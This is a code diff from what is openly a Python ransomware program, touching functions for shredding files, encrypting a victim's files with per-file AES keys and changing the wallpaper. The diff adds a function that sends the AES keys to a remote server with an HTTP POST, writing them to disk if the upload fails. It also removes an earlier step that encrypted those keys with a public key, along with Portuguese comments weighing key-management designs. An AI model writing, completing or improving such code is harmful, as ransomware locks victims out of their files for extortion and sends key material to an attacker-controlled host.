@@ -27,6 +27,17 @@ ransomware_path = os.path.join(home, ransomware_name)
 test_path = "/home/tarcisio/teste/"
 
 
+def send_to_server_aes_keys(aes_keys):
+    
+    # do something with id later 
+    try:
+        ret = requests.post(server_address, data=str(aes_keys))
+    except Exception as e:
+        raise e
+
+
+
+
 def shred(file_name,  passes=1):
 
     def generate_data(length):
@@ -89,40 +100,15 @@ def menu():
 
     # FILE ENCRYPTION STARTS HERE !!!
     aes_keys_and_base64_path = start_encryption(files)
-    enc_aes_key_and_base64_path = []
-
-    for _ in aes_keys_and_base64_path:
-        aes_key = _[0]
-        base64_path = _[1]
-
-        # encrypt with the client public key
-        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
-        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
     
-    # free the old AES keys
-    aes_keys_and_base64_path = None
-    gc.collect()
-    del aes_keys_and_base64_path
-
-    # save to disk -> ENC(AES) BASE64(PATH)
-    with open(ransomware_path + "/AES_encrypted_keys.txt", 'w') as f:
-        for _ in enc_aes_key_and_base64_path:
-            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
-            f.write(line)
-
-    enc_aes_key_and_base64_path = None
-    gc.collect()
-    del enc_aes_key_and_base64_path
-    
-
-    # AES for each file and encrypt AES.keys with Spub.key
-    # é ruim porque infectados podem se juntar para decrypt todos os arquivos AES
-    # não tem algo que é unico para cada infecção que é o key pair 
-     
-    # AES for each file and encrypt AES.keys with Cpub.key and encrypt Cpriv.key with Spub.key 
-    # pode assinar o dado de cada vitma a ela mesma, 
-    # gera um nível a mais de dependencia 
-
+    try:
+        send_to_server_aes_keys(aes_keys_and_base64_path)
+    except:
+        # couldn't upload to server, then save into disk    
+        with open(ransomware_path + "/AES_keys.txt", 'w') as f:
+            for _ in aes_keys_and_base64_path:
+                line = _[0] + " " + _[1] + "\n"
+                f.write(line)
 
 
 def change_wallpaper():
